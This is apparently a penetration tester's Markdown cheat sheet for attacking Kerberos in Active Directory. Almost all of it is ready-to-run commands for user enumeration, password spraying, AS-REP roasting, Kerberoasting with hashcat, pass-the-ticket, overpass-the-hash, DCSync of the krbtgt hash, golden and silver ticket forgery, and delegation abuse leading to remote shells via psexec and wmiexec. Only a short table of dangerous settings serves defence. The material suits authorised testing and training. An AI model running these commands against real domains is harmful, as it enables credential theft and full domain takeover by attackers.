#Kerberos #ActiveDirectory #authentication #ticketing #AD

## What is Kerberos?
Network authentication protocol used by Active Directory. Based on tickets — clients obtain a Ticket-Granting Ticket (TGT) from the KDC, then request Service Tickets (TGS) for individual services. Replaces NTLM for AD auth in modern environments.

- Port: **TCP/UDP 88** — Kerberos
- Port: **TCP/UDP 464** — kpasswd (password change)
- KDC runs on every Domain Controller
- Kerberos auth uses clocks — must be within **5 minutes** of DC or auth fails

---

## Key Concepts

| Term | Description |
|---|---|
| KDC | Key Distribution Center — runs on DC (AS + TGS) |
| AS | Authentication Service — issues TGT |
| TGS | Ticket Granting Service — issues service tickets |
| TGT | Ticket Granting Ticket — proves identity, used to request TGS |
| ST / TGS | Service Ticket — grants access to specific service |
| SPN | Service Principal Name — identifies service (e.g., `MSSQLSvc/host:1433`) |
| PAC | Privilege Attribute Certificate — group membership embedded in ticket |
| RC4/AES | Encryption types (RC4 = NTLM hash, AES = AES keys) |

---

## Enumeration

```bash
# Nmap
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=<domain>,userdb=users.txt <target>

# kerbrute — user enumeration (no auth required)
kerbrute userenum --dc <dc_ip> -d <domain> users.txt
kerbrute userenum --dc <dc_ip> -d <domain> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
kerbrute passwordspray --dc <dc_ip> -d <domain> users.txt 'Password123'

# Sync clock to DC (required for Kerberos)
sudo ntpdate <dc_ip>
```

---

## AS-REP Roasting

Users with `Do not require Kerberos preauthentication` set — AS-REP hash obtainable without credentials.

```bash
# Impacket — no credentials needed
impacket-GetNPUsers <domain>/ -no-pass -usersfile users.txt -dc-ip <dc_ip>
impacket-GetNPUsers <domain>/<user>:<pass> -dc-ip <dc_ip> -request -format hashcat

# impacket with domain user (enumerate all no-preauth users)
impacket-GetNPUsers <domain>/<user>:<pass> -dc-ip <dc_ip> -request

# Rubeus (Windows)
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt

# Crack hash (mode 18200)
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

---

## Kerberoasting

Request TGS tickets for service accounts (SPNs) — encrypted with service account NTLM hash. Offline crackable.

```bash
# Impacket — list SPNs and request tickets
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc_ip> -request
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc_ip> -request -outputfile kerberoast_hashes.txt

# Target specific user
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc_ip> -request -target-domain <domain>

# Rubeus (Windows)
.\Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat

# Crack hash (mode 13100 = RC4, 19700 = AES256)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 19700 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt   # AES256
```

---

## Pass-the-Ticket (PTT)

Use stolen/forged Kerberos tickets without knowing the password.

```bash
# Export tickets (Windows — mimikatz)
sekurlsa::tickets /export
# or
.\Rubeus.exe dump /nowrap

# Import ticket for use (mimikatz)
kerberos::ptt ticket.kirbi

# Import ticket (Rubeus)
.\Rubeus.exe ptt /ticket:<base64_ticket>

# Impacket — use .ccache ticket
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec <domain>/<user>@<target> -k -no-pass
impacket-wmiexec <domain>/<user>@<target> -k -no-pass
evil-winrm -i <target> -u <user> -r <domain>
```

---

## Overpass-the-Hash / Pass-the-Key

Use NT hash or AES key to get a TGT (avoids NTLM and gets Kerberos ticket).

```bash
# Impacket — get TGT using NTLM hash (RC4)
impacket-getTGT <domain>/<user> -hashes :<NTLM_hash> -dc-ip <dc_ip>

# Impacket — get TGT using AES key
impacket-getTGT <domain>/<user> -aesKey <AES256_key> -dc-ip <dc_ip>

# Use resulting .ccache
export KRB5CCNAME=<user>.ccache
impacket-psexec <domain>/<user>@<target> -k -no-pass

# Mimikatz — overpass-the-hash (inject NTLM → get TGT)
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:powershell.exe

# Rubeus — overpass-the-hash
.\Rubeus.exe asktgt /user:<user> /rc4:<NTLM_hash> /ptt
.\Rubeus.exe asktgt /user:<user> /aes256:<AES256_key> /ptt
```

---

## Golden Ticket

Forged TGT using the `krbtgt` account NTLM hash. Grants access to any service in the domain indefinitely.

```bash
# Requirements: krbtgt hash, domain SID

# Get krbtgt hash (post-DA compromise)
# mimikatz:
lsadump::dcsync /user:krbtgt

# Get domain SID
impacket-lookupsid <domain>/<user>:<pass>@<dc_ip> | grep "Domain SID"
# or: wmic computersystem get domain / powershell (Get-ADDomain).DomainSID

# Forge golden ticket (mimikatz)
kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_SID> /krbtgt:<krbtgt_NTLM_hash> /ptt

# Impacket — create golden ticket
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <domain_SID> -domain <domain> Administrator

export KRB5CCNAME=Administrator.ccache
impacket-psexec <domain>/Administrator@<target> -k -no-pass
```

---

## Silver Ticket

Forged TGS (service ticket) using the service account hash. Grants access to a specific service without touching the KDC.

```bash
# Requirements: service account NTLM hash, domain SID, SPN

# Forge silver ticket (mimikatz)
kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_SID> /target:<target_fqdn> \
  /service:cifs /rc4:<service_account_NTLM> /ptt

# Impacket
impacket-ticketer -nthash <service_account_hash> -domain-sid <domain_SID> \
  -domain <domain> -spn cifs/<target_fqdn> Administrator

export KRB5CCNAME=Administrator.ccache
impacket-smbexec <domain>/Administrator@<target> -k -no-pass
```

---

## Delegation Attacks

### Unconstrained Delegation

```bash
# Find machines with unconstrained delegation (stores TGTs of connecting users)
impacket-findDelegation <domain>/<user>:<pass> -dc-ip <dc_ip>
ldapsearch -H ldap://<dc_ip> -x -D "<user>@<domain>" -w '<pass>' -b "DC=domain,DC=com" \
  "(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" name

# Force DC to authenticate to compromised server (PrinterBug / MS-RPRN)
.\SpoolSample.exe <dc_ip> <compromised_server>

# Capture TGT from DC via Rubeus
.\Rubeus.exe monitor /interval:5 /filteruser:DC$

# Pass TGT to get DA access
.\Rubeus.exe ptt /ticket:<base64_TGT>
```

### Constrained Delegation

```bash
# Find constrained delegation configured services
impacket-findDelegation <domain>/<user>:<pass> -dc-ip <dc_ip>

# If you have the service account hash — request TGS on behalf of any user (S4U2Proxy)
.\Rubeus.exe s4u /user:<svc_user> /rc4:<hash> /impersonateuser:Administrator /msdsspn:<target_SPN> /ptt

# Impacket
impacket-getST -spn <target_SPN> -impersonate Administrator <domain>/<svc_user>:<pass> -dc-ip <dc_ip>
```

### Resource-Based Constrained Delegation (RBCD)

```bash
# If you can write msDS-AllowedToActOnBehalfOfOtherIdentity on a computer object
# Add controlled computer account to target's allowed delegation

# Add computer account
impacket-addcomputer <domain>/<user>:<pass> -dc-ip <dc_ip> -computer-name 'EVIL$' -computer-pass 'Password123'

# Set RBCD
python3 rbcd.py -f EVIL -t <target_computer> -dc-ip <dc_ip> '<domain>/<user>:<pass>'

# Get service ticket impersonating admin
impacket-getST -spn cifs/<target_fqdn> -impersonate Administrator -dc-ip <dc_ip> \
  '<domain>/EVIL$:Password123'

export KRB5CCNAME=Administrator.ccache
impacket-wmiexec <domain>/Administrator@<target> -k -no-pass
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| No Kerberos preauthentication | AS-REP Roasting |
| Weak service account passwords with SPN | Kerberoasting |
| Unconstrained delegation | TGT theft from authenticating users |
| Constrained delegation misconfiguration | Impersonation of any user |
| krbtgt hash compromised | Golden ticket forgery |
| Old Kerberos encryption (RC4 only, no AES) | Faster hash cracking |

---

## Quick Reference

| Goal | Command |
|---|---|
| User enum | `kerbrute userenum --dc dc_ip -d domain users.txt` |
| AS-REP Roast | `impacket-GetNPUsers domain/ -no-pass -usersfile users.txt -dc-ip dc_ip` |
| Crack AS-REP | `hashcat -m 18200 hashes.txt rockyou.txt` |
| Kerberoast | `impacket-GetUserSPNs domain/user:pass -dc-ip dc_ip -request` |
| Crack TGS | `hashcat -m 13100 hashes.txt rockyou.txt` |
| Get TGT (hash) | `impacket-getTGT domain/user -hashes :NTLM -dc-ip dc_ip` |
| Pass-the-Ticket | `export KRB5CCNAME=ticket.ccache; impacket-psexec ... -k -no-pass` |
| Golden ticket | `impacket-ticketer -nthash krbtgt_hash -domain-sid SID -domain domain Administrator` |
| Find delegation | `impacket-findDelegation domain/user:pass -dc-ip dc_ip` |
| Sync clock | `sudo ntpdate dc_ip` |
